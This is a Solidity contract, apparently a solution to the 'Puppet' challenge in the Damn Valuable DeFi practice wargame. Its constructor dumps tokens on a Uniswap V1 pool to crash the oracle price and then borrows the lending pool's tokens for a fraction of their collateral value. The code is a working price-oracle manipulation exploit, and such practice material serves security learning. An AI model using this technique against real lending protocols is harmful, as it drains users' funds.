// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.25;

import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract PuppetAttacker {
    constructor(
      IUniswapV1Exchange uniswapV1Exchange,
      PuppetPool lendingPool,
      DamnValuableToken token,
      address recovery,
      uint8 v, bytes32 r, bytes32 s
      ) payable {
        uint256 amount = uniswapV1Exchange.getTokenToEthInputPrice(750e18);

        token.permit(msg.sender, address(this), 1000e18, 1 days, v, r, s);
        token.transferFrom(msg.sender, address(this), 1000e18);

        token.approve(address(uniswapV1Exchange), 1000e18);
        uniswapV1Exchange.tokenToEthSwapInput(750e18, amount, block.timestamp + 1);

        uint256 requiredAmount = lendingPool.calculateDepositRequired(100_000e18);
        lendingPool.borrow{value: requiredAmount}(100_000e18, recovery);
    }
}